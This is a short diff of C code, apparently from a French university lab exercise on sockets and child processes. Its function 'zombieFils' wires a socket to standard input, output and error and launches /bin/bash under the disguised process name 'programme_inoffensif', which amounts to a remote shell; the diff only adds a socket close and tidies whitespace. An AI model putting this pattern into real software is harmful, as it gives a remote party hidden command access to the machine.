@@ -15,7 +15,7 @@ void zombieFils(void* sockfdController){
     dup2(*sockfd, STDOUT_FILENO);
     dup2(*sockfd, STDERR_FILENO);
     dup2(*sockfd,STDIN_FILENO);
-
+    sclose(*sockfd);
     sexecl("/bin/bash", "programme_inoffensif", NULL);
 }
 
@@ -29,12 +29,11 @@ int main(int argc, char *argv[]){
 
         if(sockfdController != -1){
             fork_and_run1(zombieFils, &sockfdController);
-        }else{
+        }else {
             // faire ici pour labo
             sclose(sockfdController);
             break;
         }
     }
     return 0;
-    
 }
